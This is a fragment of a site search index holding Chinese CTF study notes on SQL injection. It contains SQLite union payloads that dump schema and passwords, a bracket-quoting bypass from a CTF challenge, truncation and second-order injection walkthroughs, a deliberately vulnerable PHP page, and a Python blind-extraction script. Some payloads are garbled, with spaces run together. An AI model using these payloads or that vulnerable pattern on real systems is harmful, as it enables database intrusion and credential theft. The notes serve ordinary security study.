<p>\u5bfc\u5165\u6210\u529f\u4e4b\u540e\uff0c\u5982\u679c\u6267\u884c\u547d\u4ee4\u4e3a\u7a7a\uff0c\u5219\u4eca\u513f\u53c2\u8003https://www.cyberciti.biz/faq/ubuntu-linux-howto-disable-apparmor-commands/</p> <pre><code>\u6267\u884cln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/disable/apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqldservice mysql restart\n</code></pre>"},{"location":"web_bak/sql/sqlite/","title":"sqlite","text":"<p>SQLite \u662f\u4e00\u4e2a\u8f6f\u4ef6\u5e93\uff0c\u5b9e\u73b0\u4e86\u81ea\u7ed9\u81ea\u8db3\u7684\u3001\u65e0\u670d\u52a1\u5668\u7684\u3001\u96f6\u914d\u7f6e\u7684\u3001\u4e8b\u52a1\u6027\u7684 SQL \u6570\u636e\u5e93\u5f15\u64ce\u3002SQLite \u662f\u5728\u4e16\u754c\u4e0a\u6700\u5e7f\u6cdb\u90e8\u7f72\u7684 SQL \u6570\u636e\u5e93\u5f15\u64ce\u3002SQLite \u6e90\u4ee3\u7801\u4e0d\u53d7\u7248\u6743\u9650\u5236\u3002</p> <p>sqlite\u662f\u8f7b\u91cf\u7ea7\u7684\u6570\u636e\u5e93\uff0c\u5728\u5f00\u53d1\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u7ecf\u5e38\u88ab\u4f7f\u7528\uff0c\u5f00\u53d1\u5b8c\u6210\u4e4b\u540e\u624d\u8f6c\u6362\u4e3amysql</p>"},{"location":"web_bak/sql/sqlite/#_1","title":"\u8bed\u6cd5","text":"<p>\u56e0\u4e3a\u6211\u4e5f\u6728\u6709\u7cfb\u7edf\u7684\u5b66\u4e60\u8fc7\uff0c\u53ea\u80fd\u751f\u642c\u4e86</p>"},{"location":"web_bak/sql/sqlite/#sqlite_master","title":"sqlite_master","text":"<p>sqlite_master\u8868\u4e2d\u4fdd\u5b58\u6570\u636e\u5e93\u8868\u7684\u5173\u952e\u4fe1\u606f\u3002</p> <p>\u4ecesqlite_master\u67e5\u8868\u540d:</p> <p>sqlite&gt;selecttbl_namefromsqlite_masterwheretype='table';</p> <p>\u7c7b\u4f3c\u662fmysql\u4e2d\u7684information-schema\u5143\u6570\u636e\u5e93\u7684\u4fe1\u606f\u3002</p> <p>\u67e5\u7248\u672c\u3002</p> <p>\u67e5\u8868\u540d\u548c\u5b57\u6bb5</p> <pre><code>0' union select1,2,sqlite_version();\n0' union select 1,2,sql from sqlite_master;\nor\n0' union select 1,2,sql from sqlite_masterwhere type='table';\nor\n0' union select 1,2,sqlfrom sqlite_master where type='table' and name='user_data';\n</code></pre> <p>\u591a\u6761\u8bb0\u5f55\u65f6\u53ef\u4ee5\u4f7f\u7528group_concat\u805a\u5408\u6216\u8005\u4f7f\u7528limit</p> <pre><code>0' union select 1,2,group_concat(tbl_name)FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --\n</code></pre> <p>\u6216\u8005\u4f7f\u7528limit\u6765\u8f93\u51fa\u4e00\u884c\u7ed3\u679c</p> <pre><code>0' union select1,2,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like'sqlite_%' limit 2 offset 1 --\n</code></pre> <p>\u53e6\u5916\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684payload\u83b7\u53d6\u5230\u683c\u5f0f\u5316\u8fc7\u7684\u5217\u540d\uff1a</p> <pre><code>0' union select1,2,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')+1)),instr((substr(sql,instr(sql,'(')+1)),'`')),\"TEXT\",''),\"INTEGER\",''),\"AUTOINCREMENT\",''),\"PRIMARYKEY\",''),\"UNIQUE\",''),\"NUMERIC\",''),\"REAL\",''),\"BLOB\",''),\"NOTNULL\",''),\",\",'~~') from sqlite_master where type='table' andname='user_data' --\n</code></pre> <p>\u67e5\u6570\u636e</p> <pre><code>0' union selectid,name,passwd from user_data;\n</code></pre> <p>\u4f7f\u7528group_concat\u8fde\u63a5\u67e5\u8be2\u7ed3\u679c</p> <pre><code>0' union select1,2,group_concat(passwd) from user_data;\n</code></pre> <p>\u5728\u521b\u5efa\u8868\u65f6\u53ef\u4ee5\u7528as\u6765\u590d\u5236\u53e6\u4e00\u4e2a\u8868\u4e2d\u7684\u6570\u636e\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u53ef\u4ee5\u7528as select sql from sqlite_master\u6765\u590d\u5236sqlite_master\u7684sql\u5b57\u6bb5\u3002</p> <p>\u5177\u4f53\u53c2\u8003\uff1a</p> <p>sqlite\u6ce8\u5165\u7684\u4e00\u70b9\u603b\u7ed3 - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/8627</p>"},{"location":"web_bak/sql/sqlite/#sqlite-bypass","title":"Sqlite bypass","text":"<p>\u76ee\u524d\u5c31\u78b0\u5230\u8fd9\u4e00\u4e2a\uff0c\u800c\u4e14\u7406\u89e3\u8d77\u6765\u6709\u70b9\u9ebb\u70e6</p> <p>\u662fsqlite\u81ea\u8eab\u7684\u6027\u8d28\uff0c\u901a\u8fc7\u95ed\u5408\u6765\u5f3a\u884c\u62fc\u51d1\u51fasql\u6ce8\u5165\u7684\u8bed\u53e5\u3002</p> <p>\u6211\u4eec\u5728\u4f7f\u7528sqlite_master\u65f6\u4f7f\u7528\u9519\u8bef\u7684\u8bed\u6cd5\uff0csqlite\u5c06\u4f1a\u5ffd\u7565\u540e\u9762\u5217\u7684\u540d\u79f0\uff0c\u65e0\u8bba\u5217\u7684\u540d\u79f0\u662f\u5426\u771f\u5b9e\u7684\u5b58\u5728\uff0c\u9664\u975e\u5728\u5217\u4e4b\u95f4\u653e\u7f6e\u3002</p> <p>select\u7684\u65f6\u5019\uff0c\u5f53\u5217\u540d\u7528\u7a7a\u767d\u5b57\u7b26\u9694\u5f00\u65f6\uff0csqlite\u53ea\u4f1a\u628a\u7a7a\u683c\u4e4b\u524d\u7684\u5b57\u7b26\u5f53\u505a\u5217\u540d\uff0c\u5e76\u4e14\u5ffd\u89c6\u7a7a\u683c\u540e\u7684\u5b57\u7b26</p> <p></p> <p>[]\u548c'\u3001\"\u3001`\u3001\u4e00\u6837\u53ef\u4ee5\u5305\u88f9\u5217\u540d</p> <p></p> <p>select [id][fdas3\"`] from test</p> <p>//1</p> <p>select [id]\"dgfsgfs\" from test</p> <p>//1</p> <p>select [id]fdas from test</p> <p>//1</p> <p>\u7b2c\u4e00\u4e2a\u5217\u540d\u53ef\u4ee5\u6b63\u5e38\u8bfb\u53d6\u3002\u7b2c\u4e8c\u4e2a\u5c31\u4f1a\u81ea\u52a8\u5ffd\u7565</p> <p>\" ' ` [] \u90fd\u53ef\u4ee5\u6b63\u5e38\u5305\u88f9\u5217\u540d</p> <p>insert\u8bed\u53e5\u4e5f\u5dee\u4e0d\u591a</p> <p>$sql = \"CREATE TABLE [aaa] as select [sql][ (dummy1TEXT, dummy2 TEXT, <code>]from sqlite_master;</code> 2);\";</p> <p>\u7b49\u4e8e</p> <p>create table [aaa] as select sql from sqlite_master</p> <p>\u67e5\u627esqlite_master\u4e2dsql\u5217\u7684\u503c\u653e\u5165aaa\u8868\u4e2d</p> <p>creat table [aaa] as select sql as[dummy1TEXT, dummy2 TEXT(table_name\u4f20\u53c2\u5185\u5bb9)&amp;columns[0][name]=]from sql_master;\u8fd9\u91cc\u662f\u7b2c\u4e00\u79cd\u89e3\u91ca\u7684\u65b9\u6cd5</p> <p>\u9898\u76ee\u6765\u6e90</p>"},{"location":"web_bak/sql/sqlite/#zer0pts2020phpnantokaadmin","title":"[Zer0pts2020]phpNantokaAdmin","text":"<p>\u8fd9\u662f\u4e00\u9053sqlite\u6ce8\u5165\u7684\u9898\u76ee\uff0c\u8003\u5bdf\u70b9\uff1a\u6211\u4eec\u5728\u4f7f\u7528sqlite_master\u65f6\u4f7f\u7528\u9519\u8bef\u7684\u8bed\u6cd5\uff0csqlite\u5c06\u4f1a\u5ffd\u7565\u540e\u9762\u5217\u7684\u540d\u79f0\uff0c\u65e0\u8bba\u5217\u7684\u540d\u79f0\u662f\u5426\u771f\u5b9e\u7684\u5b58\u5728\uff0c\u9664\u975e\u5728\u5217\u4e4b\u95f4\u653e\u7f6e\u3002\uff1a</p> <p>table_name=[aaa] as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=2</p> <p>sql = \"CREATE TABLE {table_name} (\";</p> <p>$sql .= \"dummy1 TEXT, dummy2 TEXT\";</p> <p>\u633a\u795e\u5947\u7684\uff0c\u9996\u5148\u4f7f\u7528[aaa]\u6765\u76f8\u5f53\u4e8e\u8986\u76d6\u6389sql.\u540e\u7684dummy1,dummy2\uff0c\u7531\u4e8e\u5355\u6b21\u4f20\u9012\u6570\u636e\u5b57\u7b26\u6570\u91cf\u7684\u9650\u5236\uff0c\u5728[]\u4e2d\u6211\u4eec\u4f20\u9012&amp;columns\u6765\u62fc\u63a5\u4f20\u9012\u8d85\u51fa\u5b57\u7b26\u7684\u51fd\u6570\uff0c\u4f46\u662f\u5728\u5b9e\u9645sqlite\u8fdb\u884c\u89e3\u6790\u7684\u65f6\u5019\uff0c\u53c8\u7531\u4e8e\u5728[]\u4e4b\u540e\u88ab\u5ffd\u7565\u3002\u6700\u540e\u76f8\u5f53\u4e8e\uff1a</p> <p>creat table [aaa]as select sql from sqlite_master;</p> <p>creat table [aaa] as select sql as[dummy1 TEXT, dummy2 TEXT(table_name\u4f20\u53c2\u5185\u5bb9)&amp;columns[0][name]=]from sql_master;</p> <p>\u627e\u5230\u53e6\u5916\u4e00\u79cd\u89e3\u91ca:select\u7684\u65f6\u5019\uff0c\u5f53\u5217\u540d\u7528\u7a7a\u767d\u5b57\u7b26\u9694\u5f00\u65f6\uff0csqlite\u53ea\u4f1a\u628a\u7a7a\u683c\u4e4b\u524d\u7684\u5b57\u7b26\u5f53\u505a\u5217\u540d\uff0c\u5e76\u4e14\u5ffd\u89c6\u7a7a\u683c\u540e\u7684\u5b57\u7b26</p> <p>payload\u5c31\u4e3a\uff1a[aaa]as select [sql][&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=2</p>"},{"location":"web_bak/sql/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E7%9A%84sql%E6%94%BB%E5%87%BB/","title":"\u57fa\u4e8e\u7ea6\u675f\u7684sql\u653b\u51fb","text":"<p>\u9996\u5148\u7ed9\u51fa\u4e0d\u662fsql\u6ce8\u5165\u7684sql</p> <p>\u7a0d\u5fae\u63cf\u8ff0\u4e00\u4e0b\uff1a\u5c31\u662f\u8bf4\uff0c\u5f53\u6211\u9650\u5b9asql\u4e2d\u67d0\u4e00\u4e2a\u53d8\u91cf\u7684\u503c\u7684\u957f\u5ea6\u65f6\uff0c\u82e5\u53d8\u91cf\u957f\u5ea6\u7684\u503c\u5c0f\u4e8e\u8be5\u503c\uff0c\u90a3\u4e48sql\u5728\u505a\u6bd4\u8f83\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u586b\u5145\u7a7a\u683c\u5206\u5272\u7b26\uff0c\u5f53\u53d8\u91cf\u7684\u957f\u5ea6\u5927\u4e8e\u8be5\u503c\u7684\u65f6\u5019\uff0c\u90a3\u4e48sql\u4f1a\u81ea\u52a8\u5730\u622a\u53d6\u8be5\u503c\u7684\u957f\u5ea6\u3002</p> <p>\u6bd4\u5982\u8bf4\u9650\u5236\u4e3a10\uff0c\u4e5f\u5c31\u662f\u8bfb10\u4f4d</p> <p>\u8f93\u5165100000\u5c31\u4f1a\u53d8\u6210100000%20%20%20%20\uff08%20\u5c31\u662f\u7a7a\u683c\uff09</p> <p>1145141919810\u5c31\u4f1a\u53d8\u62101145141919\uff0c\u540e\u9762\u76841919\u88ab\u622a\u65ad\u7b49\u629b\u5f03\u4e86</p> <p>1\u3001\u65b0\u5efa\u8868\u683c\u540d\u5b57\u4e3auser\uff0c\u8be5\u8868\u7684\u7ea6\u675f\u7684\u662f\u540d\u5b57\u548c\u5bc6\u7801\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc710</p> <pre><code>create table user(id int primary key auto_increment,//id\u5b57\u6bb5\uff0cint\u7c7b\u578b\uff0c\u5173\u952e\u5b57\uff0c\u81ea\u52a8\u589e\u52a0name varchar(10) not null,//name\u5b57\u6bb5\uff0c\u5b57\u7b26\u4e32\uff0c\u4e0d\u5141\u8bb8\u4e3a\u7a7apass varchar(10) not null)//year\u5b57\u6bb5\uff0cint\u7c7b\u578b\uff0c\u4e0d\u5141\u8bb8\u4e3a\u7a7a\n</code></pre> <p>2\u3001\u63d2\u5165\u4e24\u6761\u6b63\u5e38\u6570\u636e</p> <pre><code>insert into user (name,pass) values (\"aiyou\",123456);insert into user (name,pass) values (\"admin\",123456);\n</code></pre> <p>3\u3001\u63d2\u5165\u957f\u5ea6\u5927\u4e8e10\u7684\u7528\u6237\u540d</p> <pre><code>insert into user (name,pass) values (\"admin123456789\",123456);\n</code></pre> <p>4\u3001\u67e5\u770b\u63d2\u5165\u7684\u6570\u636e\uff0c\u53d1\u73b0\u53ea\u4fdd\u7559\u4e86\u5341\u4e2a\u5b57\u7b26</p> <p></p> <p>5\u3001\u518d\u63d2\u5165\u4e00\u6761\u52a0\u7a7a\u683c\u7684\u7528\u6237\u540d\uff0c\u53d1\u73b0\u548c\u4e0d\u52a0\u7a7a\u683c\u63d2\u5165\u7684admin\u4e00\u6837</p> <p></p> <p>[SKCTF]login1</p>"},{"location":"web_bak/sql/SQL_Injection/order_by_%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5/","title":"order by \u6392\u5e8f\u6ce8\u5165","text":"<p>\u5199\u4e0d\u52a8\u4e86\uff0ccopy\u4e86</p> <p>\u9996\u5148\u5047\u8bbe\u6709\u8fd9\u6837\u4e00\u5f20\u8868</p> <p></p> <p>\u6709\u4ee5\u4e0b\u4ee3\u7801</p> <pre><code>&lt;?php\n$servername = \"localhost\";\n$username = \"root\";\n$password = \"\";\n$dbname = \"ctf\";\n$conn = new mysqli($servername, $username, $password, $dbname);\n\nfunction check($s){\n         if(preg_match(\"/\\)|\\(|_|\\.|\\|/i\",$s))  #()_.|\n       {    \n             die('hack!'); \n       }\n   }\n$username=$_GET['username'];\ncheck($username);\n\n$sql = \"select * from user where username='$username'\";\n$result = $conn-&gt;query($sql);\n\nif ($result-&gt;num_rows &gt; 0) {\n    if($row = $result-&gt;fetch_assoc()) {\n        echo \"username: \" . $row[\"username\"].\"&lt;br&gt;\";\n    }\n}\n$conn-&gt;close();\n?&gt;\n</code></pre> <p>\u56e0\u4e3a()_.|\u88ab\u8fc7\u6ee4\uff0c\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u4eceinformation_schema\u548c\u51fd\u6570\u83b7\u53d6\u4fe1\u606f\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u8981\u83b7\u53d6admin\u7684flag\u7684hash\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053\u5b57\u6bb5\u540d\uff0c\u4e14\u6ca1\u6709.\u4e0d\u80fd\u4f7f\u7528\u522b\u540d\u6216\u5b50\u67e5\u8be2\u7684\u65b9\u5f0f\u83b7\u53d6\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684\u65b9\u6cd5\u3002</p> <p>\u4e0b\u9762\u6b63\u5f0f\u5f00\u59cb</p> <p>\u9996\u5148\u6211\u4eec\u77e5\u9053order by \u53ef\u4ee5\u6392\u5e8f\uff0c\u6240\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u53ef\u4ee5\u8fdb\u884c\u5b57\u7b26\u4e32\u6bd4\u8f83\uff0c\u5982\u4e0b\u5c31\u662forder by \u5bf9admin\u8fdb\u884c\u5462\u6bd4\u8f83\u6211\u4eec\u73b0\u5728\u5c31\u5df2\u7ecf\u786e\u5b9a\u524d\u4e24\u4e2a\u5b57\u6bcd\u4e3aad\u4e86</p> <p></p> <p></p> <p>\u540c\u7406</p> <p></p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u77e5\u9053admin\u7684flag\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e3a7\u4e86\uff0c\u7ee7\u7eed</p> <p></p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u77e5\u9053\uff0c\u524d\u4e24\u4e2a\u5b57\u7b26\u4e3a79\u4e86 //9\u7684ascii\u4e3a57\u800c:\u7684ascii\u4e3a58\uff0c\u6240\u4ee5:\u6bd49\u5927</p> <p>\u4ee5\u6b64\u6211\u4eec\u53ef\u4ee5\u5199\u51fa\u4ee5\u4e0b\u811a\u672c</p> <pre><code>import requests\n\nurl= 'http://127.0.0.1/mysql.php'\nflag=''\nfor i in range(50):\n    for j in range(48,128):\n        payload=\"?username=xxx' or 1=1 union select 1,2,'%s' order by 3 limit 1,2;\\x00\"%(flag+chr(j))\n        r=requests.get(url+payload).text\n        print j\n        if 'admin' in r:\n            flag+=chr(j-1)\n            print flag.lower() #793914c9c583d9d86d0f4ed8c521b0c1\n            break\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/","title":"\u4e8c\u6b21\u6ce8\u5165","text":"<p>\u4e8c\u6b21\u6ce8\u5165\u9700\u8981\u5177\u5907\u7684\u4e24\u4e2a\u6761\u4ef6\uff1a</p> <p>\uff081\uff09\u7528\u6237\u5411\u6570\u636e\u5e93\u63d2\u5165\u6076\u610f\u8bed\u53e5\uff08\u5373\u4f7f\u540e\u7aef\u4ee3\u7801\u5bf9\u8bed\u53e5\u8fdb\u884c\u4e86\u8f6c\u4e49\uff0c\u5982mysql_escape_string\u3001mysql_real_escape_string\u8f6c\u4e49\uff09</p> <p>\uff082\uff09\u6570\u636e\u5e93\u5bf9\u81ea\u5df1\u5b58\u50a8\u7684\u6570\u636e\u975e\u5e38\u653e\u5fc3\uff0c\u76f4\u63a5\u53d6\u51fa\u6076\u610f\u6570\u636e\u7ed9\u7528\u6237</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u7a0d\u5fae\u7422\u78e8\u4e00\u4e0b\u5c31\u80fd\u770b\u61c2</p> <p>\uff081\uff09\u5728sqli_libs\u7684\u7b2c24\u5173,\u5176\u9875\u9762\u5982\u4e0b\u6240\u793a:</p> <p></p> <p>\uff082\uff09\u5f53\u6211\u4eec\u70b9\u51fbForgot your password?\u65f6\uff0c\u51fa\u73b0\u63d0\u793a\uff1a</p> <p></p> <p>\uff083\uff09\u56e0\u6b64\u53ef\u4ee5\u5c1d\u8bd5\u5728\u6ce8\u518c\u9875\u9762\u8fdb\u884c\u4e8c\u6b21\u6ce8\u5165\uff0c\u9996\u5148\uff0c\u6211\u4eec\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\uff0c\u540d\u4e3a\uff1aadmin'#   ,\u5bc6\u7801\u4e3a\uff1a123456</p> <p></p> <p>\uff084\uff09\u6ce8\u518c\u6210\u529f\uff0c\u5c1d\u8bd5\u767b\u5f55admin\u2018#  \uff0c\u7136\u540e\u53ef\u4ee5\u67e5\u770b\u4e00\u4e0bphpmyadmin\u5185\u5b58\u50a8\u60c5\u51b5</p> <p></p> <p></p> <p></p> <p>\uff085\uff09\u800c\u8fd9\u65f6\u7684admin\u539f\u5bc6\u7801\u662fadmin\uff0c\u5e76\u4e14\u4e24\u4e2a\u8d26\u53f7\u90fd\u5b58\u50a8\u5728\u6570\u636e\u5e93\u5185\u7684\u3002\u5f53\u6211\u4eec\u91cd\u65b0\u4fee\u6539admin'#\u7684\u5bc6\u7801\u7684\u65f6\u5019\uff0c\u8fd9\u91cc\u4fee\u6539\u4e3a\uff1a12345678\uff1b\u53ef\u4ee5\u53d1\u73b0\u4e8c\u6b21\u6ce8\u5165\u7684\u5a01\u529b\u6240\u5728\u3002admin\u7684\u5bc6\u7801\u88ab\u4fee\u6539\u4e3a\u4e86\uff1a12345678\uff1b\u800cadmin'#\u7528\u6237\u7684\u5bc6\u7801\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316\u3002</p> <p></p> <p></p> <p>\uff086\uff09\u4ee3\u7801\u5ba1\u8ba1\uff0c\u5c1d\u8bd5\u5206\u6790\u6e90\u7801\uff0c\u51fa\u73b0\u95ee\u9898\u7684\u9875\u9762\u5f88\u663e\u7136\u662f\u6ce8\u518c\u9875\u9762\uff0c\u4e0e\u5bc6\u7801\u4fee\u6539\u91cd\u7f6e\u7684\u9875\u9762\u3002</p> <p>\u6ce8\u518c\u7528\u6237\u65f6\uff1a          \u4ec5\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u4e86\u8f6c\u4e49\uff0c\u5224\u65ad\u8f93\u5165\u4e24\u6b21\u5bc6\u7801\u662f\u5426\u4e00\u81f4\uff0c\u7136\u540e\u5c06\u7528\u6237\u952e\u5165\uff0c\u5c06\u6570\u636e\u63d2\u5165\u81f3\u6570\u636e\u5e93\u3002sql = \"insert into users ( username, password) values(\\\"username\\\", \\\"$pass\\\")\"</p> <p>\u8fd9\u91cc\u76f4\u63a5\u63d2\u5165\u4e86\u6570\u636e</p> <p>\u4fee\u6539\u5bc6\u7801\u65f6\uff1ausername= _SESSION[\"username\"];//\u76f4\u63a5\u53d6\u51fa\u4e86\u6570\u636e\u5e93\u7684\u6570\u636esql = \"UPDATE users SET PASSWORD='sql = \"UPDATE users SET PASSWORD='sql = \"UPDATE users SET PASSWORD='sql = \"UPDATE users SET PASSWORD='pass' where username='username' and password='curr_pass' \";//\u5bf9\u8be5\u7528\u6237\u7684\u5bc6\u7801\u8fdb\u884c\u66f4\u65b0$sql = \"UPDATE users SET PASSWORD='12345678' where username='admin\u2018#</p> <p>\u6267\u884c\u6210\u529f\uff01</p> <p>[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web5]CyberPunk</p>"},{"location":"web_bak/sql/SQL_Injection/%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/","title":"\u57fa\u672c\u539f\u7406","text":"<p>\u521d\u89c1\u53ef\u4ee5\u770b\u770b\uff0c\u5176\u4ed6\u968f\u610f</p> <p>\u6240\u8c13SQL\u6ce8\u5165\uff0c\u5c31\u662f\u901a\u8fc7\u628aSQL\u547d\u4ee4\u63d2\u5165\u5230Web\u8868\u5355\u9012\u4ea4\u6216\u8f93\u5165\u57df\u540d\u6216\u9875\u9762\u8bf7\u6c42\u7684\u67e5\u8be2\u5b57\u7b26\u4e32\uff0c\u6700\u7ec8\u8fbe\u5230\u6b3a\u9a97\u670d\u52a1\u5668\u6267\u884c\u6076\u610f\u7684SQL\u547d\u4ee4\uff0c\u6bd4\u5982\u5148\u524d\u7684\u5f88\u591a\u5f71\u89c6\u7f51\u7ad9\u6cc4\u9732VIP\u4f1a\u5458\u5bc6\u7801\u5927\u591a\u5c31\u662f\u901a\u8fc7WEB\u8868\u5355\u9012\u4ea4\u67e5\u8be2\u5b57\u7b26\u66b4\u51fa\u7684\uff0c\u8fd9\u7c7b\u8868\u5355\u7279\u522b\u5bb9\u6613\u53d7\u5230SQL\u6ce8\u5165\u5f0f\u653b\u51fb\uff0e\u5f53\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8f93\u5165\u5185\u5bb9\u6765\u6784\u9020\u52a8\u6001sql\u8bed\u53e5\u4ee5\u8bbf\u95ee\u6570\u636e\u5e93\u65f6\uff0c\u4f1a\u53d1\u751fsql\u6ce8\u5165\u653b\u51fb\u3002\u5982\u679c\u4ee3\u7801\u4f7f\u7528\u5b58\u50a8\u8fc7\u7a0b\uff0c\u800c\u8fd9\u4e9b\u5b58\u50a8\u8fc7\u7a0b\u4f5c\u4e3a\u5305\u542b\u672a\u7b5b\u9009\u7684\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u6765\u4f20\u9012\uff0c\u4e5f\u4f1a\u53d1\u751fsql\u6ce8\u5165\u3002</p> <p>SQL\u6ce8\u5c04\u80fd\u4f7f\u653b\u51fb\u8005\u7ed5\u8fc7\u8ba4\u8bc1\u673a\u5236\uff0c\u5b8c\u5168\u63a7\u5236\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6570\u636e\u5e93\u3002 SQL\u662f\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00\u7684\u7b80\u79f0\uff0c\u5b83\u662f\u8bbf\u95ee\u6570\u636e\u5e93\u7684\u4e8b\u5b9e\u6807\u51c6\u3002\u76ee\u524d\uff0c\u5927\u591a\u6570Web\u5e94\u7528\u90fd\u4f7f\u7528SQL\u6570\u636e\u5e93\u6765\u5b58\u653e\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u3002\u51e0\u4e4e\u6240\u6709\u7684Web\u5e94\u7528\u5728\u540e\u53f0 \u90fd\u4f7f\u7528\u67d0\u79cdSQL\u6570\u636e\u5e93\u3002\u8ddf\u5927\u591a\u6570\u8bed\u8a00\u4e00\u6837\uff0cSQL\u8bed\u6cd5\u5141\u8bb8\u6570\u636e\u5e93\u547d\u4ee4\u548c\u7528\u6237\u6570\u636e\u6df7\u6742\u5728\u4e00\u8d77\u7684\u3002\u5982\u679c\u5f00\u53d1\u4eba\u5458\u4e0d\u7ec6\u5fc3\u7684\u8bdd\uff0c\u7528\u6237\u6570\u636e\u5c31\u6709\u53ef\u80fd\u88ab\u89e3\u91ca\u6210\u547d\u4ee4\uff0c \u8fd9\u6837\u7684\u8bdd\uff0c\u8fdc\u7a0b\u7528\u6237\u5c31\u4e0d\u4ec5\u80fd\u5411Web\u5e94\u7528\u8f93\u5165\u6570\u636e\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u5728\u6570\u636e\u5e93\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u4e86\u3002</p> <p>SQL\u6ce8\u5165\u5f0f\u653b\u51fb\u7684\u4e3b\u8981\u5f62\u5f0f\u6709\u4e24\u79cd\u3002\u4e00\u662f\u76f4\u63a5\u5c06\u4ee3\u7801\u63d2\u5165\u5230\u4e0eSQL\u547d\u4ee4\u4e32\u8054\u5728\u4e00\u8d77\u5e76\u4f7f\u5f97\u5176\u4ee5\u6267\u884c\u7684\u7528\u6237\u8f93\u5165\u53d8\u91cf\u3002\u7531\u4e8e\u5176\u76f4\u63a5\u4e0eSQL\u8bed\u53e5\u6346\u7ed1\uff0c\u6545\u4e5f\u88ab\u79f0\u4e3a\u76f4\u63a5\u6ce8\u5165\u5f0f\u653b\u51fb\u6cd5\u3002\u4e8c\u662f\u4e00\u79cd\u95f4\u63a5\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u5b83\u5c06\u6076\u610f\u4ee3\u7801\u6ce8\u5165\u8981\u5728\u8868\u4e2d\u5b58\u50a8\u6216\u8005\u4f5c\u4e3a\u539f\u4e66\u636e\u5b58\u50a8\u7684\u5b57\u7b26\u4e32\u3002\u5728\u5b58\u50a8\u7684\u5b57\u7b26\u4e32\u4e2d\u4f1a\u8fde\u63a5\u5230\u4e00\u4e2a\u52a8\u6001\u7684SQL\u547d\u4ee4\u4e2d\uff0c\u4ee5\u6267\u884c\u4e00\u4e9b\u6076\u610f\u7684SQL\u4ee3\u7801\u3002\u6ce8\u5165\u8fc7\u7a0b\u7684\u5de5\u4f5c\u65b9\u5f0f\u662f\u63d0\u524d\u7ec8\u6b62\u6587\u672c\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u8ffd\u52a0\u4e00\u4e2a\u65b0\u7684\u547d\u4ee4\u3002\u5982\u4ee5\u76f4\u63a5\u6ce8\u5165\u5f0f\u653b\u51fb\u4e3a\u4f8b\u3002\u5c31\u662f\u5728\u7528\u6237\u8f93\u5165\u53d8\u91cf\u7684\u65f6\u5019\uff0c\u5148\u7528\u4e00\u4e2a\u5206\u53f7\u7ed3\u675f\u5f53\u524d\u7684\u8bed\u53e5\u3002\u7136\u540e\u518d\u63d2\u5165\u4e00\u4e2a\u6076\u610fSQL\u8bed\u53e5\u5373\u53ef\u3002\u7531\u4e8e\u63d2\u5165\u7684\u547d\u4ee4\u53ef\u80fd\u5728\u6267\u884c\u524d\u8ffd\u52a0\u5176\u4ed6\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u5e38\u5e38\u7528\u6ce8\u91ca\u6807\u8bb0\u201c\u2014\u201d\u6765\u7ec8\u6b62\u6ce8\u5165\u7684\u5b57\u7b26\u4e32\u3002\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u8ba4\u4e3a\u6b64\u540e\u8bed\u53e5\u4f4d\u6ce8\u91ca</p> 